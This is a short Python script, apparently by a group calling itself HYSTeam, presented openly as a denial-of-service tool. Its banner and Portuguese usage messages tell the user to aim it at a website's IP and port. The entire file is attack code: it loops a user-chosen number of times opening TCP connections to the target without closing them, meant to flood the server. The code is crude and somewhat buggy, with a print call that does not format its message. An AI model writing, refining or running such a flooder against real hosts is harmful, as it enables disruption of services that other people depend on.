#!/usr/bin/python
import socket
import sys
import os

main = """ 
 ____       ____    ____  ____         _    _   _____ ___  
|  _ \  ___/ ___|  / ___||  _ \       / \  | | |_   _/ _ \ 
| | | |/ _ \___ \  \___ \| |_) |     / _ \ | |   | || | | |
| |_| | (_) |__) |  ___) |  _ < _   / ___ \| |___| || |_| |
|____/ \___/____/  |____/|_| \_(_) /_/   \_\_____|_| \___/ 

Powered by SR. ALTO...\n\n
#HYSTeam""" 

count = 0

def init(ip, port, main):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(0.08)
    code = client.connect_ex((ip, int(port)))
    if code == 0:
        print("[===>] SR. ALTO | DOS = IP: %s, Porta: %s", ip, port)
    else:
        print("\033[0;33;41m[!] ERRO. Servidor indisponivel ou porta fechada\033[m")
        
if len(sys.argv) < 4:
    print("""
     ____       ____    ____  ____         _    _   _____ ___  
    |  _ \  ___/ ___|  / ___||  _ \       / \  | | |_   _/ _ \ 
    | | | |/ _ \___ \  \___ \| |_) |     / _ \ | |   | || | | |
    | |_| | (_) |__) |  ___) |  _ < _   / ___ \| |___| || |_| |
    |____/ \___/____/  |____/|_| \_(_) /_/   \_\_____|_| \___/ 
    Powred by SR. ALTO
    #HYSTeam
    """)
    print("\033[0;33;41m[!] Parece que voce nao especificou tudo.\033[m")
    print("\033[0;33;41m[!] Exemplo: python2 TBot.py 192.168.0.1 80 5000.\033[m")
    print("\033[0;33;41m[!] Exemplo: python2 TBot.py (IP DO SITE) (80) (Pacotes).\033[m")
    print (" ")
    sys.exit(0)
else:
    ip = sys.argv[1]
    port = sys.argv[2]
    dados = int(sys.argv[3])
    while count < dados:
        count+=1
        init(ip, port, main)
    print("\033[0;33;41m[!] DoS Parado!\033[m")
    
